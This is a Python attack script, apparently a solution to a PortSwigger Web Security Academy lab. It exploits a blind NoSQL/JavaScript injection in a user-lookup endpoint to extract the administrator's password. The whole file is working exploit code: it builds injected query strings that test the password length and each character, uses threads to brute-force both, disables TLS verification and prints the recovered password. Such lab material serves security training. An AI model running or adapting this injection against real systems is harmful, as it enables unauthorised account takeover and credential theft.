import threading
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://0a520072043ea95081fff35200ee00e7.web-security-academy.net/"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Cookie": "session=fF72Q5hjW729DmhEd8xQqLzMYiOxFDJD",
    "Referer": BASE_URL
}

found_length = None
password_list = []

def check_password_length(length: int):
    url = f"{BASE_URL}/user/lookup?user=administrator'+%26%26+this.password.length=={length}+||+'1'=='2"
    response = requests.get(url, headers=HEADERS, verify=False)
    if "administrator" in response.text:
        global found_length
        found_length = length

def get_password_length() -> int:
    threads = [threading.Thread(target=check_password_length, args=(len, ), daemon=True) for len in range(5, 30)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    global found_length
    return found_length 

def get_password_char(char, pass_length):
    for index in range(pass_length):
        url = f"{BASE_URL}/user/lookup?user=administrator'+%26%26+this.password[{index}]=='{char}'+||+'1'=='2"
        response = requests.get(url, headers=HEADERS, verify=False)
        if "administrator" in response.text:
            global password_list
            password_list.append((index, char))

def get_password(pass_length):
    threads = [threading.Thread(target=get_password_char, args=(char, pass_length, )) for char in "abcdefghijklmnopqrstuvwxyz"]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
if __name__ == "__main__":
    length = get_password_length()
    print(f"[+] Password length: {length}")
    get_password(length)
    
    password = ""
    password_list.sort(key=lambda x: x[0])
    for index, char in password_list:
        password += char
    
    print(f"[+] Password: {password}")